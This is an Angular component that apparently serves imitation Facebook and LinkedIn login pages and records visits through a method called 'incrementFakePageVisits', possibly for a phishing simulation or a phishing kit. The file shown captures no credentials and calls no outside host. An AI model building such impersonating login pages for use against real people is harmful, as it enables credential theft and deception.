import { Component, OnInit } from '@angular/core';
import { FormsModule } from '@angular/forms';
import { ApiService } from '../api.service';
import { ActivatedRoute } from '@angular/router';
import { DomSanitizer, SafeHtml } from '@angular/platform-browser';
import {NgIf} from '@angular/common';
import {FacebookComponent} from './pages/facebook.component';
import {LinkedinComponent} from './pages/linkedin.component';

@Component({
  selector: 'app-login-pages',
  imports: [
    FormsModule,
    NgIf,
    FacebookComponent,
    LinkedinComponent
  ],
  templateUrl: './login-pages.component.html',
  styleUrl: './login-pages.component.css'
})
export class LoginPagesComponent implements OnInit {
  id!: string | null;
  html: SafeHtml = '';

  constructor(private apiService: ApiService, private route: ActivatedRoute, private sanitizer: DomSanitizer) {}

  ngOnInit() {

    this.id = this.route.snapshot.paramMap.get('id');
    if (this.id != null) {
      this.apiService.incrementFakePageVisits(this.id).subscribe({
        error: (error) => {
          console.error('Failed to increment visits', error);
        }
      });
    }
  }
}
